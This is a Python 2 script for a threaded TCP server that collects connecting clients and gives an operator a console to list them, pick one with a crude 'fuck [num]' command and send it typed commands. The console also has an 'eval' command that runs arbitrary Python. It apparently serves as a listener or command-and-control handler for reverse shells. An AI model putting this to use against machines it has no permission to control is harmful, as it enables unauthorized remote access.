#!/usr/bin/env python
# -*- coding: utf-8 -*-

import SocketServer
import threading
import socket

HOST = '0.0.0.0'
PORT = 9999
BUFSIZE = 1024 * 4

CLIENTS = []


class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):

    def setup(self):
        # print(self.client_address)
        CLIENTS.append({self.client_address[0]: self.request})

    def handle(self):
        data = self.request.recv(BUFSIZE)
        cur_thread = threading.current_thread()
        # response = "{}: {}".format(cur_thread.name, data)
        print(data)
        print("\n")
        # self.request.sendall(response)

    def finish(self):
        print("finish\n")
        # print(self.client_address[0] + "\n")


class MyThreadingTCPServer(SocketServer.ThreadingTCPServer):

    def __init__(self, server_address, RequestHandlerClass):
        SocketServer.ThreadingTCPServer.__init__(
            self, server_address, RequestHandlerClass)
        self.request_queue_size = 200
        self.socket_type = socket.SOCK_STREAM


if __name__ == '__main__':
    server = MyThreadingTCPServer(
        (HOST, PORT), ThreadedTCPRequestHandler)
    try:
        st = threading.Thread(target=server.serve_forever)
        st.daemon = True
        st.start()
        print "Server loop running in thread:", st.name
        cmd = raw_input("cmd > ")
        while cmd:
            if cmd == 'ls':
                print("ls\n")
                for i in range(1, len(CLIENTS) + 1):
                    print("%d\t%s" % (i, CLIENTS[i - 1]))
            elif cmd[:4] == 'fuck':
                cid = int(cmd[4:])
                if not cid:
                    print("fuck [num]")
                if CLIENTS[cid - 1]:
                    print(CLIENTS[cid - 1])
                    print("client %s >\n" % CLIENTS[cid - 1][1])
                    client = CLIENTS[cid - 1][CLIENTS[cid - 1].keys()[0]]
                    ccmd = raw_input("client > ")
                    while ccmd:
                        if ccmd == "vquit":
                            break
                        client.sendall(ccmd)
                        ccmd = raw_input("client > ")
            elif cmd == 'exit':
                server.shutdown()
                server.server_close()
                break
            elif cmd[:4] == 'eval':
                eval(cmd[4:])
            else:
                print("Error cmd : %s" % cmd)
            cmd = raw_input("cmd > ")
    except KeyboardInterrupt:
        print("^C")
        server.shutdown()
        server.server_close()
    except Exception as e:
        print(e)
# try:
    # cmd = raw_input("cmd > ")
    # while cmd:
    #     if cmd == 'ls':
    #         print("ls\n")
    #         for i in CLIENTS:
    #             print("\t%s" % i)
    #     elif cmd == 'exit':
    #         print("exit\n")
    #         STOP = True
    #         sys.exit(0)
    #     else:
    #         print("Error cmd : %s" % cmd)
    #     cmd = raw_input("cmd > ")
# except KeyboardInterrupt:
#     sys.exit(0)
